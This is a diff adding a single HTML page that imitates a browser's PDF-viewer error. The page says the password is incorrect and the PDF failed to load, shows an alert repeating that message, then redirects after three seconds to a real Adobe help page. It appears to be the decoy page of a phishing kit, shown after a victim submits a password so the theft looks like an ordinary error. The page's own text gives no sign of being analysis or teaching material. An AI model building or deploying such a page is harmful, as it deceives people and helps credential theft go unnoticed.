@@ -1,0 +1,89 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wrong Password For Document</title>
+<style>
+body {
+  font-family: Arial;
+  color: white;
+}
+
+.split {
+  height: 100%;
+  width: 85%;
+  position: fixed;
+  z-index: 1;
+  top: 0;
+  overflow-x: hidden;
+  padding-top: 20px;
+}
+
+.left {
+  left: 0;
+  background-color: #111;
+}
+
+.right {
+  right: 0;
+  background-color: #141817;
+  background-image: url("https://i.gyazo.com/bb592d368abc53a3bc0ed8e0e6e4e16d.png");
+  background-position: center; background-repeat: no-repeat; background-size: cover;
+}
+
+.centered {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  /* text-align: center; */
+}
+
+.centered img {
+  width: 150px;
+  border-radius: 50%;
+}
+.content {
+  width: 500px;
+  height: 150px;
+  margin: auto;
+  border-radius: 10px;
+  background: #292a2d;
+  padding: 20px;
+  font-family:Verdana, Geneva, Tahoma, sans-serif;
+}
+</style>
+</head>
+<body >
+
+<div class="split left">
+
+ 
+</div>
+
+<div class="split right">
+  <div class="centered">
+
+
+    <div class="content">
+      <p style="padding-left: 2rem; font-weight: 500px;">Password is Incorrect</p>
+      <p style="padding: 1rem 2rem;color: #9AA0A6;font-size: 13px;">Failed to load PDF document.  </p>
+      <button onclick="myFunction()" style="float: right; padding: 10px 20px; background-color: #8AB4F8; border: #8AB4F8; border-radius: 3px;"> Reload </button>
+      </div>
+      
+  </div>
+</div>
+     
+
+<script language="javascript">alert("Failed to Load PDF Document, Incorrect Password.");</script>
+<script>
+        const redirect = () => window.location.href = "https://www.adobe.com/acrobat/hub/how-to/why-pdfs-will-not-open.html#:~:text=Here%20are%20some%20of%20the,or%20needs%20to%20be%20rebooted."
+        setTimeout(redirect, 3000)
+    </script>
+
+</body>
+</html> 
